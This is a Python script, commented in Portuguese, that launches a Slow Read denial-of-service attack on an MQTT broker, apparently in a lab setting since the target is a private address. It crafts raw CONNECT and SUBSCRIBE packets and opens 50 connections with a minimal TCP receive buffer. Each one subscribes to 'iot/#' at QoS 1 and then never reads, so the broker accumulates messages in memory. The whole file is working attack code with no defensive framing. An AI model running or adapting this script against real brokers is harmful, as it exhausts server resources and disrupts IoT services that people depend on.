import socket
import time
import struct
import sys

TARGET_IP = "10.0.2.10"
TARGET_PORT = 1883
NUM_CONEXOES = 50  # Número de assinantes lentos
TOPICO_ALVO = "iot/#"

def build_connect(client_id, keep_alive=300):
    """Constrói pacote CONNECT v3.1.1"""
    protocol_name = b"MQTT"
    protocol_level = 4
    connect_flags = 0x02  # Clean Session
    
    client_id_bytes = client_id.encode('utf-8')
    payload = struct.pack("!H", len(client_id_bytes)) + client_id_bytes
    
    var_header = (
        struct.pack("!H", len(protocol_name)) + protocol_name +
        struct.pack("!B", protocol_level) +
        struct.pack("!B", connect_flags) +
        struct.pack("!H", keep_alive)
    )
    
    remaining_len = len(var_header) + len(payload)
    return struct.pack("!BB", 0x10, remaining_len) + var_header + payload

def build_subscribe(packet_id, topic, qos=1):
    """Constrói pacote SUBSCRIBE (QoS 1 para forçar o Broker a reter mensagens)"""
    topic_bytes = topic.encode('utf-8')
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic_bytes)) + topic_bytes + struct.pack("!B", qos)
    
    remaining_len = len(var_header) + len(payload)
    # 0x82 = SUBSCRIBE (Control Packet Type 8 + Reserved Bits 0010)
    return struct.pack("!BB", 0x82, remaining_len) + var_header + payload

def iniciar_slow_read():
    sockets = []
    print(f"[*] Alvo: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Criando {NUM_CONEXOES} conexões Slow Read com janela TCP reduzida...")

    for i in range(NUM_CONEXOES):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # --- CHAVE DO ATAQUE SLOW READ ---
            # Reduz o buffer de recepção TCP do kernel para o valor mínimo permitido (ex: 1024 bytes)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)
            s.settimeout(5)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # 1. Envia CONNECT
            conn_pkt = build_connect(f"slow_reader_{i}")
            s.sendall(conn_pkt)
            s.recv(4)  # Recebe CONNACK
            
            # 2. Envia SUBSCRIBE no tópico das telemetrias
            sub_pkt = build_subscribe(packet_id=i+1, topic=TOPICO_ALVO, qos=1)
            s.sendall(sub_pkt)
            s.recv(5)  # Recebe SUBACK
            
            sockets.append(s)
            if (i + 1) % 10 == 0:
                print(f"[+] {i + 1} leitores lentos inscritos no tópico '{TOPICO_ALVO}'.")
                
        except Exception as e:
            print(f"[-] Erro ao estabelecer leitor {i}: {e}")
            break
        time.sleep(0.05)

    print(f"\n[✓] Ataque Slow Read Ativo! {len(sockets)} conexões travando o buffer TCP do Broker.")
    print("[*] As mensagens do Sensor serão acumuladas na RAM do Broker devido à Janela TCP Zero.")
    print("[*] Pressione Ctrl+C para encerrar o ataque.")

    try:
        # O atacante entra em loop e NUNCA chama s.recv(), fazendo o buffer encher
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        print("\n[*] Encerrando conexões...")
        for s in sockets:
            s.close()

if __name__ == "__main__":
    iniciar_slow_read()
